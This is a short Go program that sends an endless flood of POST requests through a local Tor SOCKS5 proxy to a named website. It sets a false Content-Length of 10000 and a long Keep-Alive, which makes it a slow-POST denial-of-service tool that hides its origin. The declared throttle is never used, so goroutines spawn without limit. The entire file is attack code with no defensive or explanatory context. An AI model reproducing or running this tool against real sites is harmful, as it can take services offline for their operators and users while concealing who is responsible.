package main

import (
	"fmt"
	"golang.org/x/net/proxy"
	"net/http"
	"net/url"
	_ "os"
)

const maxConcurrency = 4

var throttle = make(chan int, maxConcurrency)

func main() {
	torProx, err := url.Parse("socks5://127.0.0.1:9050")

	if err != nil {
		panic(err)
	}

	torDial, err := proxy.FromURL(torProx, proxy.Direct)

	if err != nil {
		panic(err)
	}

	transport := &http.Transport{Dial: torDial.Dial}
	client := &http.Client{Transport: transport}
	req, err := http.NewRequest("POST", "http://ewanvalentine.io", nil)

	if err != nil {
		panic(err)
	}

	req.Header.Add("Content-Length", "10000")
	req.Header.Add("Keep-Alive", "900")

	const N = 100

	for {
		go SendRequest(client, req)
	}
}

func SendRequest(client *http.Client, req *http.Request) {
	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
	fmt.Println("POST returned: ", resp.Status)
}
